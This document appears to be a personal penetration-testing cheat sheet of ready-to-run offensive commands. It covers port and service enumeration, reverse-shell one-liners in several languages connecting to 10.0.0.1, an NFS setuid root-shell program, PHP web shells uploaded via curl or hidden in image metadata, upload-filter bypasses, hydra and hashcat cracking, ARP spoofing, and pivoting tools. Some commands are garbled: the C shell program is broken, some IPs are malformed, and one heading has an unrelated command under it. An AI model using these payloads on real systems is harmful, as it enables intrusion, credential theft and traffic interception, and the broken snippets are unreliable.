Accessone's Pentest CheatSheet compilation
------------------------------------------

INITIAL ENUM.
-------------

MASS SCAN:
----------
masscan -p1-65535,U:1-65535 10.10.10.x --rate=1000 -e tun0

Live host discovery Ping sweep:

nmap -sn 10.10.10.0/24 
fping -a -g 10.10.10..0/24 2>/dev/null | tee live_hosts.txt
netdiscover -r 10.10.10.0/24

Extract Live IPs From Map Scan:
smtp-user-enum -U /usr/share/wordlists/names.txt -t $TARGET -m 150

services and all ports:
nmap -v -sV -p- 10.10.10.10

syn stealth, OS and service version info, traceroute and scripts against services:
nmap -v -sS -A -T4 10.10.10.10
	
As above but scans all TCP ports (takes a lot longer)
nmap -v -sS -p- -A -T4 10.10.10.10
	
As above but scans all TCP ports and UDP scan (takes even longer)
nmap -v -sU -sS -p- -A -T4 target
	
Nmap script to scan for vulnerable SMB servers - WARNING: unsafe=1 may cause knockover:
nmap -v -p 445 --script=smb-check-vulns 
--script-args=unsafe=1 192.168.1.X
	
Search nmap scripts:
ls /usr/share/nmap/scripts/* | grep ftp

nmap scan types:
-sS: TCP SYN Scan (aka Stealth Scan)
-sT: TCP Connect Scan 
-sU: UDP Scan
-sn: Port Scan
-sV: Service Version information
-O: Operating System information


DNS ENUMERATION:
----------------

whois google.com

google dork:
site:google.com

dns recon & research, find & lookup dns records:
https://dnsdumpster.com/


nslookup google.com

dns ip lookup:
dig a google.com @nameserver

mx record lookup:
dig mx google.com @nameserver

zone transfer with Dig:
dig axfr google.com @nameserver

DNS Zone Transers:
------------------

nslookup -> set type=any -> ls -d google.com -- windows

dig axfr google.com @ns1.google.com --linux 



BANNER GRABBING:
----------------

nc -v 01.10.10.11 80
telnet 01.10.10.11 80
curl -vX 01.10.10.11


EMAIL ENUMERATION:
------------------

hunter.io

gathers and verifys email addresses assossiatd with the given domain:
./simplyemail.py -all -e google.com

SIMPLE MAIL TRANSFER PROTOCOL ENUMERATION:
------------------------------------------

smtp-user-enum -U /usr/share/wordlists/names.txt -t $TARGET -m 150


RPC/Netbios/SAMB/SMB ENUMERATION:
---------------------------------
nbtstat alternative:
nmblookup -A 10.10.10.10


smb null session:
smbclient //MOUNT/share -I 10.10.10.10 -N  
smbclient ////10.10.10.10//share -N

list shares:
smbclient -L //10.10.1.10


rpcinfo -p 10.10.01.10

rpc null session:
rpcclient -U "" 10.10.10.10

enum4linux 10.10.10.10

nbtscan 10.10.10.0/24

Display netbios info about target:
nbtstat -A 10.10.10.10 

enumerate netbios fileserver shares:
net view 10.10.10.10

enum machine shares:
enum -s 10.10.10.10

enumerte users:
enum -U 10.10.01.10

check pass policy:
enum -p 10.10.10.10


SNMP Enumeration (Simple Network Management Protocol):
------------------------------------------------------
# Windows User Accounts
snmpwalk -c public -v1 10.10.10.10 1.3.6.1.4.1.77.1.2.25
​
# Windows Running Programs
snmpwalk -c public -v1 10.10.10.10 1.3.6.1.2.1.25.4.2.1.2
​
# Windows Hostname
snmpwalk -c public -v1 10.10.10.10 .1.3.6.1.2.1.1.5
​
# Windows Share Information
snmpwalk -c public -v1 10.10.10.10 1.3.6.1.4.1.77.1.2.3.1.1
​
# Windows Share Information
snmpwalk -c public -v1 10.10.10.10 1.3.6.1.4.1.77.1.2.27
​
# Windows TCP Ports
snmpwalk -c public -v1 10.10.10.104 1.3.6.1.2.1.6.13.1.3
​
# Software Name
snmpwalk -c public -v1 10.10.10.10 1.3.6.1.2.1.25.6.3.1.2
​
# brute-force community strings
onesixtyone -i snmp-ips.txt -c community.txt
​
snmp-check 10.01.01.10


NFS Exported Shares:
---------------------

List exported shares:
showmount -e 10.10.10.10

check if 'rw,no_root_squash' is present. If it is present, compile the below sid-shell.c:

sid-shell.c

#include <unistd.h>
​
main( int argc, char ** argv, char ** envp )
{
    setgid(0); setuid(0); system("/bin/bash", argv, envp);
    return 0;
}

-----------------------------------------------------------------------------------------------
upload it to the share and execute the following to execute sid-shell to spawn a root shell:

chown root:root sid-shell; chmod +s sid-shell; ./sid-shell




KERBEROS ENUMERATION:
---------------------

users:
nmap 10.10.10.10 -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='test'



HTTP Brute-Force & Vulnerability Scanning:
------------------------------------------

gobuster -u http://10.01.10.10 -r -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt -t 150

nikto -h http://10.10.10.10:80 

wpscan --url http://10.10.10.10:80 --enumerate u,t,p



--00--00**GAINING ACCESS**00--00--
----------------------------------

RevShell OneLiners:
-------------------

Bash:
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1

Perl:
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

Python:
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

PHP:
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'

Ruby:
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

NetCat Without -e:
 rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 1234 > /tmp/f
 

XTERM

xterm -display 10.10.10.10:1


Working with Restricted Shells:
-------------------------------

rare cases ssh
ssh bill@localhost ls -l /tmp

nice /bin/bash

**INTERACTIVE TTY SHELLS**
--------------------------

/usr/bin/expect sh

python -c ‘import pty; pty.spawn(“/bin/sh”)’


# execute one command with su as another user if you do not have access to the shell. Credit to g0blin.co.uk

python -c 'import pty,subprocess,os,time;(master,slave)=pty.openpty();p=subprocess.Popen(["/bin/su","-c","id","bynarr"],stdin=slave,stdout=slave,stderr=slave);os.read(master,1024);os.write(master,"fruity\n");time.sleep(0.1);print os.read(master,1024);'


Uploading/POSTing Files Through WWW Upload Forms:
--------------------------------------------------

# POST file
curl -X POST -F "file=@/file/location/shell.php" http://Target.com/upload.php --cookie "cookie"
​
# POST binary data to web form
curl -F "field=<shell.zip" http://google.com/upload.php -F 'k=v' --cookie "k=v;" -F "submit=true" -L -v



using put to PUT a file on a webhost:
--------------------------------------

curl -X PUT -d '<?php system($_GET["c"]);?>' http://10.10.10.10/revshell.php


Generating Payload Pattern & Calculating Offset using MSF:
----------------------------------------------------------

/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2000

/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q $EIP_VALUE


Bypassing File Upload Restrictions:
-----------------------------------

file.php -> file.jpg

file.php -> file.php.jpg

file.asp -> file.asp;.jpg

file.gif (contains php code, but starts with string GIF/GIF98)

00%

file.jpg with php backdoor in exif

Injecting PHP into JPEG:
------------------------

exiv2 -c'A "<?php system($_REQUEST['cmd']);?>"!' backdoor.jpeg

exiftool “-comment<=back.php” back.png


----------------------------------------------------------------------------------------------------------------------
        PASWORD CRACKING
__**__**----------------**__**__

Cracking Web Forms with Hydra:
-------------------------------
hydra 10.10.10.52 http-post-form -L /usr/share/wordlists/list "/endpoit/login:usernameField=^USER^&passwordField=^PASS^:unsuccessfulMessage" -s PORT -P /usr/share/wordlists/rockyou.txt


Cracking Common Protocols with hydra:
-------------------------------------
hydra 10.10.10.52 -l username -P /usr/share/wordlists/rockyou.txt ftp|ssh|smb://10.0.0.1


HASHCAT CRACKING:
-----------------

Bruteforce based on the pattern;
hashcat -a3 -m0 mantas?d?d?d?u?u?u --force --potfile-disable --stdout  
​
Generate password candidates: wordlist + pattern;
hashcat -a6 -m0 "e99a18c428cb38d5f260853678922e03" yourPassword|/usr/share/wordlists/rockyou.txt ?d?d?d?u?u?u --force --potfile-disable --stdout
​
Generate NetNLTMv2 with internalMonologue and crack with hashcat
InternalMonologue.exe -Downgrade False -Restore False -Impersonate True -Verbose False -challange 002233445566778888800

resulting hash:

spotless::WS01:1122334455667788:26872b3197acf1da493228ac1a54c67c:010100000000000078b063fbcce8d4012c90747792a3cbca0000000008003000300000000000000001000000002000006402330e5e71fb781eef13937448bf8b0d8bc9e2e6a1e1122fd9d690fa9178c50a0010000000000000000000000000000000000009001a0057005300300031005c00730070006f0074006c006500730073000000000000000000
​
crack with hashcat:

hashcat -m5600 'spotless::WS01:1122334455667788:26872b3197acf1da493228ac1a54c67c:010100000000000078b063fbcce8d4012c90747792a3cbca0000000008003000300000000000000001000000002000006402330e5e71fb781eef13937448bf8b0d8bc9e2e6a1e1122fd9d690fa9178c50a0010000000000000000000000000000000000009001a0057005300300031005c00730070006f0074006c006500730073000000000000000000' -a 3 /usr/share/wordlists/rockyou.txt --force --potfile-disable

----------------------------------------------------------------------------------------------------------------------

Routing:
--------
check tables:
ip route --linux

add a route:
ip route add 192.168.222.0/24 via 10.175.34.1

route print --windows

netstat -r ---OSX

 metaspoit Auto route
 
windows netSH port forward:
netsh interface portproxy add v4tov4 listenport=3340 listenaddress=10.1.1.110 connectport=3389 connectaddress=10.1.1.110

    1.listenaddress – is a local IP address waiting for a connection.
    2.listenport – local listening TCP port (the connection is waited on it).
    3.connectaddress – is a local or remote IP address (or DNS name) to which the incoming connection will be redirected.
    4.connectport – is a TCP port to which the connection from listenport is forwarded to.

 
ARP POISONING:
--------------
Ensure to enable port forwarding via linux kernel:

echo 1 > /proc/sys/net/ipv4/ip_forward

arpspoof -i tun0 -t 10.10.10.10(target) -r 10.10.10.1(host)

then run wireshark to intercept traffic on selected inteface!



-----------------------------------------------------------------------------------------------------------------------

        PIVOTING
_*_*_*_____________*_*_*_


SSH:
----

SOCKS PROXY:

ssh -D8080 [user]@[host]

ssh -N -f -D 9000 [user]@[host]
-f : ssh in background
-N : do not execute a remote command


Local Port Forwarding

ssh -L [bindaddr]:[port]:[dsthost]:[dstport] [user]@[host]

Remote Port Forwarding

ssh -R [bindaddr]:[port]:[localhost]:[localport] [user]@[host]
ssh -R 3389:10.1.1.224:3389 root@10.11.0.32

Metasploit:
----------
# Meterpreter list active port forwards
portfwd list 

# Forwards 3389 (RDP) to 3389 on the compromised machine running the Meterpreter shell
portfwd add –l 3389 –p 3389 –r target-host 
portfwd add -l 88 -p 88 -r 127.0.0.1
portfwd add -L 0.0.0.0 -l 445 -r 192.168.57.102 -p 445

# Forwards 3389 (RDP) to 3389 on the compromised machine running the Meterpreter shell
portfwd delete –l 3389 –p 3389 –r target-host 
# Meterpreter delete all port forwards
portfwd flush 

or

# Use Meterpreters autoroute script to add the route for specified subnet 192.168.15.0
run autoroute -s 192.168.15.0/24 
use auxiliary/server/socks_proxy
set SRVPORT 9090
set VERSION 4a
# or
use auxiliary/server/socks4a     # (deprecated)


# Meterpreter list all active routes
run autoroute -p 

route #Meterpreter view available networks the compromised host can access
# Meterpreter add route for 192.168.14.0/24 via Session number.
route add 192.168.14.0 255.255.255.0 3 
# Meterpreter delete route for 192.168.14.0/24 via Session number.
route delete 192.168.14.0 255.255.255.0 3 
# Meterpreter delete all routes
route flush 

Empire:
---------

(Empire) > socksproxyserver
(Empire) > use module management/invoke_socksproxy
(Empire) > set remoteHost 10.10.10.10
(Empire) > run

sshuttle

Transparent proxy server that works as a poor man's VPN. Forwards over ssh.

    Doesn't require admin.
    Works with Linux and MacOS.
    Supports DNS tunneling.

pacman -Sy sshuttle
apt-get install sshuttle
sshuttle -vvr user@10.10.10.10 10.1.1.0/24
sshuttle -vvr username@pivot_host 10.2.2.0/24 

# using a private key
$ sshuttle -vvr root@10.10.10.10 10.1.1.0/24 -e "ssh -i ~/.ssh/id_rsa" 

# -x == exclude some network to not transmit over the tunnel
# -x x.x.x.x.x/24

chisel:
-------

go get -v github.com/jpillora/chisel

# forward port 389 and 88 to hacker computer
user@hacker$ /opt/chisel/chisel server -p 8008 --reverse
user@victim$ .\chisel.exe client YOUR_IP:8008 R:88:127.0.0.1:88 R:389:localhost:389 

# SOCKS
user@victim$ .\chisel.exe client YOUR_IP:8008 R:socks

plink:
-------

# exposes the SMB port of the machine in the port 445 of the SSH Server
plink -l root -pw toor -R 445:127.0.0.1:445 
# exposes the RDP port of the machine in the port 3390 of the SSH Server
plink -l root -pw toor ssh-server-ip -R 3390:127.0.0.1:3389  

plink -l root -pw mypassword 192.168.18.84 -R
plink.exe -v -pw mypassword user@10.10.10.10 -L 6666:127.0.0.1:445

plink -R [Port to forward to on your VPS]:localhost:[Port to forward on your local machine] [VPS IP]
# redirects the Windows port 445 to Kali on port 22
plink -P 22 -l root -pw some_password -C -R 445:127.0.0.1:445 192.168.12.185   

ngrok:
------
# get the binary
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip
unzip ngrok-stable-linux-amd64.zip 

# log into the service
./ngrok authtoken 3U[REDACTED_TOKEN]Hm

# deploy a port forwarding for 4433
./ngrok http 4433
./ngrok tcp 4433

Basic Pivoting Types:
---------------------------------------------------------------------
Type 	Use Case

Listen - Listen 	Exposed asset, may not want to connect out.

Listen - Connect 	Normal redirect.

Connect - Connect 	Can’t bind, so connect to bridge two hosts
---------------------------------------------------------------------

Listen - Listen
Type 	Use Case
----------------
ncat 	ncat -v -l -p 8080 -c "ncat -v -l -p 9090"

socat 	socat -v tcp-listen:8080 tcp-listen:9090

remote host 1 	ncat localhost 8080 < file

remote host 2 	ncat localhost 9090 > newfile


Listen - Connect
Type 	Use Case
-----------------
ncat 	ncat -l -v -p 8080 -c "ncat localhost 9090"

socat 	socat -v tcp-listen:8080,reuseaddr tcp-connect:localhost:9090

remote host 1 	ncat localhost -p 8080 < file

remote host 2 	ncat -l -p 9090 > newfile



Connect - Connect
Type 	Use Case
------------------
ncat 	ncat localhost 8080 -c "ncat localhost 9090"

socat 	socat -v tcp-connect:localhost:8080,reuseaddr tcp-connect:localhost:9090

remote host 1 	ncat -l -p 8080 < file

remote host 2 	ncat -l -p 9090 > newfile


